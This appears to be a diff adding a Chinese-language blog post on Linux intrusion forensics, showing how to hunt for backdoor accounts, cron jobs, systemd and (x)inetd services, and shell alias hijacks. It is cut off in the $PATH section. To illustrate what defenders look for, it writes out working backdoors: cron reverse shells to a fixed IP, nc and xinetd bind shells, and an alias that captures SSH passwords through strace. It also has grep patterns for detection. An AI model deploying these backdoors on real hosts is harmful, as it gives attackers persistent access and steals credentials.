@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.5.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="后门识别后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法，是一个很泛的说法。依据用途我大概将它分为4类：  1、登录后门。用于帮助攻击者便捷的登录失陷主机。 2、间谍后门。用于偷取用户的敏感数据。 3、提权后门。用于帮助攻击者从低权限账户跳跃到高权限账户。 4、rootkit。用于帮助攻击者在失陷主机上实现顽固并隐身的驻留。  登录后门最为常见。后门想要实现持久化基本都会将自身">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux入侵事件取证(8)-查找后门">
+<meta property="og:url" content="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(8)-%E6%9F%A5%E6%89%BE%E5%90%8E%E9%97%A8/index.html">
+<meta property="og:site_name" content="aplyc1a&#39;s blogs">
+<meta property="og:description" content="后门识别后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法，是一个很泛的说法。依据用途我大概将它分为4类：  1、登录后门。用于帮助攻击者便捷的登录失陷主机。 2、间谍后门。用于偷取用户的敏感数据。 3、提权后门。用于帮助攻击者从低权限账户跳跃到高权限账户。 4、rootkit。用于帮助攻击者在失陷主机上实现顽固并隐身的驻留。  登录后门最为常见。后门想要实现持久化基本都会将自身">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-06-22T18:16:09.000Z">
+<meta property="article:modified_time" content="2021-06-22T03:26:27.496Z">
+<meta property="article:author" content="aplyc1a">
+<meta property="article:tag" content="取证">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(8)-%E6%9F%A5%E6%89%BE%E5%90%8E%E9%97%A8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(8)-%E6%9F%A5%E6%89%BE%E5%90%8E%E9%97%A8/","path":"2021/06/22/Linux入侵痕迹取证(8)-查找后门/","title":"Linux入侵事件取证(8)-查找后门"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Linux入侵事件取证(8)-查找后门 | aplyc1a's blogs</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">aplyc1a's blogs</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E8%AF%86%E5%88%AB"><span class="nav-number">1.</span> <span class="nav-text">后门识别</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E9%9D%9E%E6%8F%90%E6%9D%83%E7%B1%BB%E5%9E%8B%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5"><span class="nav-number">1.1.</span> <span class="nav-text">1 非提权类型后门排查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 后门账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E7%AF%A1%E6%94%B9%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 篡改计划任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E6%9C%8D%E5%8A%A1%E5%9E%8B%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.3 服务型后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-1-systemd%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">1.3.1 systemd后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-2-x-inetd%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">1.3.2 (x)inetd后门</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E7%AF%A1%E6%94%B9shell%E5%8F%8A%E5%85%AC%E5%85%B1%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.4 篡改shell及公共配置文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-4-1-%E5%88%AB%E5%90%8D%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">1.4.1 别名后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-4-2-%E7%AF%A1%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">1.4.2 篡改环境变量</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PATH%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.4.2.1.</span> <span class="nav-text">$PATH后门</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PROMPT-COMMAND%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.4.2.2.</span> <span class="nav-text">$PROMPT_COMMAND后门</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#LD-PRELOAD%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.4.2.3.</span> <span class="nav-text">$LD_PRELOAD后门</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#LD-LIBRARY-PATH%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.4.2.4.</span> <span class="nav-text">$LD_LIBRARY_PATH后门</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E7%AF%A1%E6%94%B9%E5%BA%93%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.5.</span> <span class="nav-text">1.5 篡改库文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-1-pam%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">1.5.1 pam后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-2-etc-ld-so-cache"><span class="nav-number">1.1.5.2.</span> <span class="nav-text">1.5.2 &#x2F;etc&#x2F;ld.so.cache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-3-etc-ld-so-preload"><span class="nav-number">1.1.5.3.</span> <span class="nav-text">1.5.3 &#x2F;etc&#x2F;ld.so.preload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E7%AF%A1%E6%94%B9%E5%91%BD%E4%BB%A4%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.6.</span> <span class="nav-text">1.6 篡改命令文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-1-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E8%87%AA%E6%A3%80"><span class="nav-number">1.1.6.1.</span> <span class="nav-text">1.6.1 包管理器自检</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-2-%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.6.2.</span> <span class="nav-text">1.6.2 检查脚本文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-3-%E6%A3%80%E6%9F%A5ELF%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.6.3.</span> <span class="nav-text">1.6.3 检查ELF文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-4-%E6%9D%A1%E4%BB%B6%E8%A7%A6%E5%8F%91%E5%9E%8B%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.6.4.</span> <span class="nav-text">1.6.4 条件触发型后门</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-%E5%85%B6%E4%BB%96"><span class="nav-number">1.1.7.</span> <span class="nav-text">1.7 其他</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-7-1-ssh%E8%BD%AF%E9%93%BE%E6%8E%A5%E5%90%8E%E9%97%A8"><span class="nav-number">1.1.7.1.</span> <span class="nav-text">1.7.1 ssh软链接后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-7-2-Git-hooks%E5%90%8E%E9%97%A8%EF%BC%88%E6%9C%AA%E8%AF%81%E5%AE%9E%EF%BC%89"><span class="nav-number">1.1.7.2.</span> <span class="nav-text">1.7.2 Git hooks后门（未证实）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-webshell-%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">2 webshell 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%B8%B8%E7%94%A8webshell%E4%B8%93%E6%9D%80%E5%B7%A5%E5%85%B7"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 常用webshell专杀工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E7%9B%AE%E5%BD%95%E6%89%8B%E5%B7%A5%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 目录手工分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 web日志分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%8F%90%E6%9D%83%E7%B1%BB%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5"><span class="nav-number">1.3.</span> <span class="nav-text">3 提权类后门排查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-suid-shell"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 suid shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-sudo%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-%E5%8F%97%E9%99%90%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2 sudo配置不当-受限命令绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E7%9B%AE%E5%BD%95%E6%88%96%E6%96%87%E4%BB%B6%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%B1%9E%E4%B8%BB%E4%B8%8D%E4%B8%80%E8%87%B4%E5%AF%BC%E8%87%B4%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.3 目录或文件与进程的属主不一致导致提权</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">aplyc1a</p>
+  <div class="site-description" itemprop="description">Always good to see</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(8)-%E6%9F%A5%E6%89%BE%E5%90%8E%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="aplyc1a">
+      <meta itemprop="description" content="Always good to see">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="aplyc1a's blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux入侵事件取证(8)-查找后门
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-06-22 10:16:09" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:09-08:00">2021-06-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-06-21 19:26:27" itemprop="dateModified" datetime="2021-06-21T19:26:27-08:00">2021-06-21</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="后门识别"><a href="#后门识别" class="headerlink" title="后门识别"></a>后门识别</h1><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法，是一个很泛的说法。依据用途我大概将它分为4类：</p>
+<ul>
+<li>1、登录后门。用于帮助攻击者便捷的登录失陷主机。</li>
+<li>2、间谍后门。用于偷取用户的敏感数据。</li>
+<li>3、提权后门。用于帮助攻击者从低权限账户跳跃到高权限账户。</li>
+<li>4、rootkit。用于帮助攻击者在失陷主机上实现顽固并隐身的驻留。</li>
+</ul>
+<p>登录后门最为常见。后门想要实现持久化基本都会将自身写入以下位置：计划任务、系统启动项、Shell配置文件、公共库文件、高频使用的命令。因此虽然后门种类有区别，但是驻留思路都是相近相通的。这类后门有些是由攻击者攻破系统后放置的，有些也可能时管理员配置疏忽导致。</p>
+<h2 id="1-非提权类型后门排查"><a href="#1-非提权类型后门排查" class="headerlink" title="1 非提权类型后门排查"></a>1 非提权类型后门排查</h2><h3 id="1-1-后门账户"><a href="#1-1-后门账户" class="headerlink" title="1.1 后门账户"></a>1.1 后门账户</h3><p>攻击者拥有账户权限后，想达到长期驻留系统时往往不修改账户密码，而是采取加用户或写公钥的方式。</p>
+<p>排查过程中主要关注： </p>
+<p>(1)    检查免口令认证公钥。</p>
+<p>有公钥输出就要确认该公钥是否属于运维人员自己的公钥。该公钥是否被用于登录。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `cat /etc/passwd|grep &quot;/bash&quot;|awk -F: &#x27;&#123;print $6&#125;&#x27;`;do cat $&#123;i&#125;/.ssh/authorized_keys ;done</span><br></pre></td></tr></table></figure>
+
+<p>找到未知公钥后可以参考下面的方法，计算出公钥的指纹信息，再在日志里面搜索，进而确定该公钥是否已被用于登录。如果搜索出来的信息关联到了一个IP，自行确认IP信息后，可以确定系统内插了个后门账户。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn `sed -n &#x27;$&#123;line_num&#125;p&#x27; ~$&#123;user&#125;/.ssh/authorized_keys |ssh-keygen -lf -|awk &#x27;&#123;print $2&#125;&#x27;` /var/log</span><br></pre></td></tr></table></figure>
+
+<p>(2)    检查系统账户配置文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | awk -F: &#x27;&#123;print $3&quot;  &quot;$1&#125;&#x27;|sort -n </span><br><span class="line"><span class="meta">#</span><span class="bash">存在多个相同的uid说明有隐藏账户。</span></span><br></pre></td></tr></table></figure>
+
+<p>自行观察账户文件底部的是否有新增用户，名称，家目录是否具有迷惑性。</p>
+<h3 id="1-2-篡改计划任务"><a href="#1-2-篡改计划任务" class="headerlink" title="1.2 篡改计划任务"></a>1.2 篡改计划任务</h3><p>分析定时任务文件中是否存在定时创建socket,定时外发文件的动作。简单的排查命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;/dev/\| nc\|sh\|telnet\|*cat\|awk\|system\|eval\|socket\|exec&quot; /var/spool/*cron/</span><br><span class="line">grep -rn &quot;/dev/\| nc\|sh\|telnet\|*cat\|awk\|system\|eval\|socket\|exec&quot; /etc/*cron*</span><br></pre></td></tr></table></figure>
+
+<p>几个常见的定时任务后门的形式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -l | &#123; cat; echo &quot;*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.44.128/2333 0&gt;&amp;1&quot;; &#125; | crontab -</span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.44.128/5555 0&gt;&amp;1;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br><span class="line">echo &#x27; * */5 * * * root ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337&#x27; &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-服务型后门"><a href="#1-3-服务型后门" class="headerlink" title="1.3 服务型后门"></a>1.3 服务型后门</h3><h4 id="1-3-1-systemd后门"><a href="#1-3-1-systemd后门" class="headerlink" title="1.3.1 systemd后门"></a>1.3.1 systemd后门</h4><p>参考 0x06 自启动任务排查，关注以下目录中是否存在后门指令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/systemd/system/</span><br><span class="line">/run/system/system/</span><br><span class="line">[/usr]/lib/systemd/system/</span><br><span class="line">/etc/rc.*    </span><br></pre></td></tr></table></figure>
+
+<p>以下给出一个例子，systemd自启动后门运行的检查过程。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 发现开机自启动项存在名为backdoor的服务，同时网络端口上有个nc监听在41111口上。</span></span><br><span class="line">systemctl list-unit-files --type service |grep enabled</span><br><span class="line">netstat -ntaup</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看该service文件发现以下内容，这是一段bindshell指令。</span></span><br><span class="line">cat /usr/lib/systemd/system/backdoor.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Just a simple backdoor for test</span><br><span class="line">After=network.target</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=bash -c &quot;nc -l -p 41111 -e /bin/bash &amp;&quot;</span><br><span class="line">ExecReload=</span><br><span class="line">ExecStop=</span><br><span class="line">PrivateTmp=true</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-3-2-x-inetd后门"><a href="#1-3-2-x-inetd后门" class="headerlink" title="1.3.2 (x)inetd后门"></a>1.3.2 (x)inetd后门</h4><p>inetd是早期的超级任务管理程序，后来被xinetd代替。目前不少系统默认没有安装并开启xinetd。但请注意，系统内开启了telnet则一定要检查(x)inetd。</p>
+<p>一个典型的inetd后门形如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这是一个bindshell后门</span></span><br><span class="line"><span class="meta">#</span><span class="bash">inetd进程监听着某端口</span></span><br><span class="line">netstat -ntaup|grep inetd</span><br><span class="line"></span><br><span class="line">cat /etc/inetd.conf #发现存在daytime stream tcp nowait /bin/sh sh –I</span><br><span class="line"></span><br><span class="line">cat /etc/services |grep daytime #发现daytime服务绑定在(13/*)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一个典型的xinetd后门形如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这是一个bindshell后门</span></span><br><span class="line">cat /etc/xinet.d/safe-guard.xinetd</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> default: yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> description: The safe-guard server servestelnet sessions;</span></span><br><span class="line">service safe-guard</span><br><span class="line">&#123;</span><br><span class="line">  flags = REUSE</span><br><span class="line">  socket_type = stream</span><br><span class="line">  wait = no</span><br><span class="line">  user = root</span><br><span class="line">  server =/bin/bash</span><br><span class="line">  log_on_failure += USERID</span><br><span class="line">  disable = no</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cat /etc/services |grep safe-guard</span><br><span class="line">safe-guard      58888/tcp               # CentOS safe-guard master daemon</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以在排查时关注脚本文件内是否含有以下字符串：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash</span><br><span class="line">/bin/sh</span><br><span class="line">/usr/sbin/in.telnetd</span><br><span class="line">/usr/sbin/in.rshd</span><br><span class="line">/usr/sbin/in.rlogind</span><br><span class="line">/usr/sbin/in.rexecd</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-篡改shell及公共配置文件"><a href="#1-4-篡改shell及公共配置文件" class="headerlink" title="1.4 篡改shell及公共配置文件"></a>1.4 篡改shell及公共配置文件</h3><h4 id="1-4-1-别名后门"><a href="#1-4-1-别名后门" class="headerlink" title="1.4.1 别名后门"></a>1.4.1 别名后门</h4><p>命令别名后门通过在shell配置文件及公共配置文件中定义alias/hash等命令诱导用户使用被篡改的命令。排查方式比较简单，检查文档中是否出现此类关键字就行。一般来说，默认的alias即使有命令也普遍集中于ls/grep。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=(/etc/profile /etc/bashrc ~/.bashrc ~/.bash_file ~/.profile)</span><br><span class="line">for i in `echo $a`;do grep &quot;alias\|hash&quot; $i; done</span><br></pre></td></tr></table></figure>
+
+<p>常见的别名后门，如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在/etc/profile内<span class="built_in">alias</span>+strace+ssh偷密码：</span></span><br><span class="line">alias ssh=&#x27;strace -o /tmp/sshwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read -s 2048 ssh&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在/etc/profile内添加了如下命令：</span></span><br><span class="line">alias ls=&quot;alerts()&#123; ls $* --color=auto;ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=32110 &#125;;alerts&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在~/.bashrc中添加如下命令：</span></span><br><span class="line">alias sudo=&#x27;/tmp/.sudo&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>不常见的，如：<br>利用hash命令，劫持常用命令。hash 用于查看terminal创建后某项命令程序的使用次数。hash -p参数可以用来设置某个二进制程序的运行别名，如果在/etc/profile内预先执行能达到类似于alias后门的效果。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hash -p /tmp/su-backdoor su </span><br><span class="line">hash -p /tmp/sudo-backdoor sudo</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-4-2-篡改环境变量"><a href="#1-4-2-篡改环境变量" class="headerlink" title="1.4.2 篡改环境变量"></a>1.4.2 篡改环境变量</h4><p>程序的运行普遍依赖一定的环境变量，篡改环境变量可以改变程序的资源分配甚至改变使用者本想运行的命令。攻击者通过在shell配置文件及公共配置文件中设置环境变量的值达到影响程序的目的。</p>
+<h5 id="PATH后门"><a href="#PATH后门" class="headerlink" title="$PATH后门"></a>$PATH后门</h5><p>攻击类型1：篡改$PATH</p>
+<p>攻击者修改$PATH，手工加入更高优先级的目录，并放入同名后门程序，用来劫持常用的命令。排查命令：</p>
